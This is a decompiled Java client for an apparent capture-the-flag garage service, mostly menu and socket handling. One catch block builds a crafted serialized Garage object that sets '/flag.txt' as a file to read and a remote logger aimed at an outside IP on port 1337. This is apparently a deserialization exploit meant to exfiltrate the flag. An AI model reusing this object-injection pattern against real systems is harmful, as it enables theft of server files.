// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   GarageClient.java

import java.io.*;
import java.net.Socket;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.lang.ProcessBuilder;


public class GarageClient
{

    public GarageClient()
    {
        clientState = 1;
    }

    public GarageClient(String host, int port)
    {
        clientState = 1;
        this.host = host;
        this.port = port;
    }

    public void connectToServer()
        throws UnknownHostException, IOException, InterruptedException, ClassNotFoundException
    {
        boolean sessionActive = true;
        BufferedReader inFromUser = new BufferedReader(new InputStreamReader(System.in));
        Socket clientSocket = new Socket(host, port);
        String str = "";
        while(sessionActive) 
        {
            System.out.println("wait response");
            str = Utils.readFromSocket(clientSocket);
            if(str.equals("[end]"))
            {
                sessionActive = false;
                break;
            }
            System.out.println(str);
            System.out.print("User input: ");
            String sentence = inFromUser.readLine();
            if(clientState == 1)
            {
                if(sentence.equals("1"))
                {
                    Utils.writeToSocket(clientSocket, sentence);
                    clientState = 2;
                } else
                if(sentence.equals("2"))
                {
                    Utils.writeToSocket(clientSocket, sentence);
                    try
                    {
                        System.out.println("sending");
                        FileInputStream fis = new FileInputStream("garage");
                        byte garageByteArray[] = Files.readAllBytes((new File("garage")).toPath());
                        Utils.sendGarage(clientSocket, garageByteArray);
                        clientState = 2;
                        System.out.println("sent");
                    }
                    catch(FileNotFoundException e)
                    {
                        clientState = 1;
                        System.out.println("File not found.");
                        Garage garage = new Garage();
                        Manager employee = new Manager();
                        garage.setManager(employee);
                        for (int i = 0; i < 5; ++i)
                            garage.addCar(new Car("123", "456", "678"));
                        employee.setCloseMessageFile("/flag.txt");
                        employee.setLogger(new RemoteLogger("184.73.48.203", 1337));
                        FileOutputStream fos = new FileOutputStream("garage");
                        fos.write(garage.toByteArray());
                        fos.close();
                        System.out.println("saved");
                        ObjectOutputStream oos = new ObjectOutputStream(clientSocket.getOutputStream());
                        oos.writeObject(new Garage());
                        oos.flush();
                        //ByteArrayOutputStream out = new ByteArrayOutputStream();
                        //ObjectOutputStream os = new ObjectOutputStream(out);
                        //os.writeObject(l);
                        //Utils.sendGarage(clientSocket, out.toByteArray());
                        //clientState = 2;
                    }
                } else
                if(sentence.equals("3"))
                {
                    Utils.writeToSocket(clientSocket, sentence);
                    sessionActive = false;
                } else
                {
                    Utils.writeToSocket(clientSocket, sentence);
                    str = Utils.readFromSocket(clientSocket);
                    System.out.println(str);
                }
            } else
            if(clientState == 2)
                if(sentence.equals("1"))
                {
                    Utils.writeToSocket(clientSocket, sentence);
                    for(int i = 0; i < 3; i++)
                    {
                        str = Utils.readFromSocket(clientSocket);
                        System.out.println(str);
                        System.out.print("User input: ");
                        sentence = inFromUser.readLine();
                        Utils.writeToSocket(clientSocket, sentence);
                    }

                    str = Utils.readFromSocket(clientSocket);
                    System.out.println(str);
                } else
                if(sentence.equals("2"))
                {
                    Utils.writeToSocket(clientSocket, sentence);
                    str = Utils.readFromSocket(clientSocket);
                    System.out.println(str);
                    System.out.print("User input: ");
                    sentence = inFromUser.readLine();
                    Utils.writeToSocket(clientSocket, sentence);
                    str = Utils.readFromSocket(clientSocket);
                    System.out.println(str);
                } else
                if(sentence.equals("3"))
                {
                    Utils.writeToSocket(clientSocket, sentence);
                    byte garageByteArray[] = Utils.receiveGarage(clientSocket);
                    FileOutputStream fos = new FileOutputStream("garage");
                    fos.write(garageByteArray);
                    fos.close();
                } else
                if(sentence.equals("4"))
                {
                    Utils.writeToSocket(clientSocket, sentence);
                    str = Utils.readFromSocket(clientSocket);
                    System.out.println(str);
                } else
                if(sentence.equals("5"))
                {
                    Utils.writeToSocket(clientSocket, sentence);
                    clientState = 1;
                } else
                {
                    Utils.writeToSocket(clientSocket, sentence);
                    str = Utils.readFromSocket(clientSocket);
                    System.out.println(str);
                }
        }
    }

    private String host;
    private int port;
    private int clientState;
}
